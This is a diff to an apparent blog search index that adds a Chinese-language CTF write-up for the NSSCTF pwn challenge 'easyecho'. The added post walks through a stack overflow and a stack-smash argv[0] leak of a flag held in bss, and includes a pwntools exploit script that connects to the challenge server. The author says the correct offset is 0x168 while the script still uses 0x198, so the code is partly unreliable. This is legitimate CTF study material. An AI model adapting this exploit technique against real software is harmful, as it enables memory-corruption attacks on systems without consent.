@@ -4,6 +4,25 @@
   
     
     <entry>
+      <title>nssctf</title>
+      <link href="/2024/07/10/nssctf/"/>
+      <url>/2024/07/10/nssctf/</url>
+      
+        <content type="html"><![CDATA[<p>一些wp<span id="more"></span></p><p>checksec<br><img src="/2024/07/10/nssctf/easyecho_1.png"><br>64位，保护全开</p><p>丢到ida里<br>发现sub_CF0函数把flag写到bss段上<br><img src="/2024/07/10/nssctf/easyecho_2.png"><br><img src="/2024/07/10/nssctf/easyecho_3.png"><br>看到存在明显的栈溢出，采用stacksmash，当输入backdoor时就调用CF0函数</p><p>动调一下，得到argv[0]的距离<br><img src="/2024/07/10/nssctf/easyecho_4.png" style="zoom: 67%;"><br>看到距离为0x198但是此处的距离不对，正确的是0x168(具体原因不清楚，可能由于网站给的附件的问题)</p><p>exp  </p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">'amd64'</span>, os = <span class="string">'linux'</span>, log_level = <span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">'node4.anna.nssctf.cn'</span>, <span class="number">28260</span>)</span><br><span class="line"><span class="comment">#io = process('./easyecho')</span></span><br><span class="line">elf = ELF(<span class="string">'./easyecho'</span>)</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b'a'</span> * <span class="number">0xf</span> + <span class="string">b'b'</span></span><br><span class="line">io.sendafter(<span class="string">b'Name:'</span>, payload1)</span><br><span class="line">io.recvuntil(<span class="string">b'b'</span>)</span><br><span class="line">addr_base = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>)) - <span class="number">0xcf0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">'addr_base:'</span>, <span class="built_in">hex</span>(addr_base))</span><br><span class="line">bss_addr = addr_base + <span class="number">0x202040</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b'Input: '</span>, <span class="string">b'backdoor\x00'</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b'a'</span> * <span class="number">0x198</span> + p64(bss_addr)</span><br><span class="line">io.sendlineafter(<span class="string">b'Input: '</span>, payload2)</span><br><span class="line">io.sendlineafter(<span class="string">b'Input: '</span>, <span class="string">b'exitexit'</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> PWN </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>一个wp和linux文件描述符及重定向</title>
       <link href="/2024/07/10/%E4%B8%80%E4%B8%AAwp%E5%92%8Clinux%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E5%8F%8A%E9%87%8D%E5%AE%9A%E5%90%91/"/>
       <url>/2024/07/10/%E4%B8%80%E4%B8%AAwp%E5%92%8Clinux%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E5%8F%8A%E9%87%8D%E5%AE%9A%E5%90%91/</url>
